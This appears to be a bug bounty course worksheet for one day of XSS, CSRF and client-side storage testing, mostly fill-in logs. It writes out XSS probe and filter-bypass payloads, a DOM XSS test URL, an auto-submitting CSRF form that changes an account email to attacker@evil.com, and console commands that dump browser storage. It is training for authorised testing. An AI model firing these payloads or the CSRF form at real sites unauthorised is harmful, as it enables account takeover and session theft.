---
title: "First Programme Sprint Day 4 — XSS, CSRF, and Client-Side Testing"
tags: [live-programme, bug-bounty, XSS, CSRF, client-side, practice]
module: 05-BugBountyOps-03
day: 334
related_topics:
  - First Programme Sprint Day 3 (Day 333)
  - XSS and CSRF Exploitation (Day 127)
  - Weak Area Reinforcement Day 3 (Day 318)
---

# Day 334 — First Programme Sprint Day 4: XSS, CSRF, and Client-Side Testing

---

## Goals

Test all user-controlled input points for XSS.
Test state-changing requests for CSRF protection gaps.
Check client-side storage and JS-accessible sensitive data.

**Time budget:** 5–6 hours.

---

## XSS Surface Mapping

```
All input fields found (search, comments, profile, forms):
  1. ___  — reflected: Y/N, stored: Y/N
  2. ___  — reflected: Y/N, stored: Y/N
  3. ___  — reflected: Y/N, stored: Y/N

HTTP headers reflected in responses:
  Referer: Y/N
  User-Agent: Y/N
  X-Forwarded-For: Y/N

URL parameters reflected in HTML: ___
```

---

## XSS Testing Log

### Reflected XSS

```
Parameter: ___  Endpoint: ___

Baseline payload: <script>alert(1)</script>  → Result: ___
  - Filtered: Y/N
  - Encoded in output: Y/N  (HTML / URL / JavaScript encoded)
  - Reflected in: attribute / text / script / href / style

If filtered, bypass attempts:
  <img src=x onerror=alert(1)>           Result: ___
  <svg onload=alert(1)>                  Result: ___
  "><img src=x onerror=alert(1)>         Result: ___
  javascript:alert(1)  (in href=)        Result: ___
  <body onresize=alert(1)>               Result: ___

Confirmed XSS payload: ___
Impact payload (cookie exfil or action): ___
```

### Stored XSS

```
Field: ___  (comment / bio / name / address / other)
Payload stored: ___
Triggers on page: ___  (which page renders the stored value)
Admin visibility: Y/N  (if admin views this → admin XSS → critical)
```

### DOM-Based XSS

```
Source checked:
  document.location.search in innerHTML: Y/N
  document.location.hash in innerHTML: Y/N
  postMessage without origin check: Y/N

URL test: https://TARGET/path?q=<img src=x onerror=alert(1)>
Result: ___
```

---

## CSRF Testing Log

```
State-changing endpoints found:
  1. POST /api/change-email   CSRF token present: Y/N
  2. POST /api/change-password CSRF token present: Y/N
  3. DELETE /api/account      CSRF token present: Y/N
  4. ___

CSRF token properties (if present):
  Per-session or per-request: ___
  Validated server-side: Y/N  (test: remove token → accepted: Y/N)
  Tied to user session: Y/N  (test: swap to another user's token → accepted: Y/N)

CSRF PoC (if token missing or broken):
  <form method="POST" action="https://TARGET/api/change-email">
    <input type="hidden" name="email" value="attacker@evil.com">
  </form>
  <script>document.forms[0].submit()</script>
```

---

## Client-Side Storage Check

```bash
# Browser console checks
localStorage.length          # how many items?
Object.keys(localStorage).forEach(k => console.log(k, localStorage[k]))

sessionStorage.length
Object.keys(sessionStorage).forEach(k => console.log(k, sessionStorage[k]))

# Indexed DB
indexedDB.databases().then(d => console.log(d))

# Service worker
navigator.serviceWorker.getRegistrations().then(r => console.log(r))
```

```
Sensitive data found in localStorage: ___
JWT stored in localStorage (XSS risk): Y/N
Session token in localStorage: Y/N  (HttpOnly would prevent this in cookies)
```

---

## Findings Log

```
Finding #1 (XSS):
  Type: Reflected / Stored / DOM
  Location: ___
  Payload: ___
  Impact demonstrated: ___  (cookie theft / admin action / account takeover)
  Severity: ___

Finding #2 (CSRF):
  Endpoint: ___
  Action: ___
  Token: missing / bypassed
  Severity: ___
```

---

## Questions

> Add your questions here. Each question gets a Global ID (Q334.1, Q334.2 …).

---

## Navigation

← Previous: [Day 333 — First Programme Sprint Day 3](DAY-0333-First-Programme-Sprint-Day-03.md)
→ Next: [Day 335 — First Programme Sprint Day 5](DAY-0335-First-Programme-Sprint-Day-05.md)
